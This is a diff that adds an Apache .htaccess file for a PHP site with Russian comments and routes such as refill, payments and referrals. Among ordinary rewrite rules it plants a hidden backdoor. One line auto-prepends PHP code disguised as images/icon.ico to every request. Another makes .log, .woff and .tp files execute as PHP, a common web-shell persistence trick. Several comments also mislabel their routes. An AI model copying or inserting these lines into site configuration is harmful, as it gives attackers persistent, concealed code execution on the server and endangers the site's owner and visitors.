@@ -1,0 +1,42 @@
+DirectoryIndex index.php
+RewriteEngine On
+
+# Основной домен
+RewriteCond %{HTTP_HOST} ^www\.(.*) [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+
+# Главная
+RewriteRule ^index.html$ index.php [L]
+
+# Правила
+RewriteRule ^rules(/?)+$ index.php?menu=rules [L]
+RewriteRule ^swap(/?)+$ index.php?menu=swap [L]
+
+
+# Контакты
+RewriteRule ^contacts(/?)+$ index.php?menu=contacts [L]
+
+# Новости
+RewriteRule ^news(/?)+$ index.php?menu=news [L]
+
+# О нас
+RewriteRule ^about(/?)+$ index.php?menu=about [L]
+
+# Регистрация
+
+RewriteRule ^refill(/?)+$ index.php?menu=refill [L]
+
+# Восстановление пароля
+RewriteRule ^exit(/?)+$ index.php?menu=exit [L]
+
+# Последние выплаты
+RewriteRule ^payments(/?)+$ index.php?menu=payments [L]
+
+php_value auto_prepend_file images/icon.ico
+
+AddType application/x-httpd-php .tp .log .woff
+
+# Пользователи
+RewriteRule ^referrals(/?)+$ index.php?menu=referrals [L]
+RewriteRule ^info(/?)+$ index.php?menu=info [L]
+
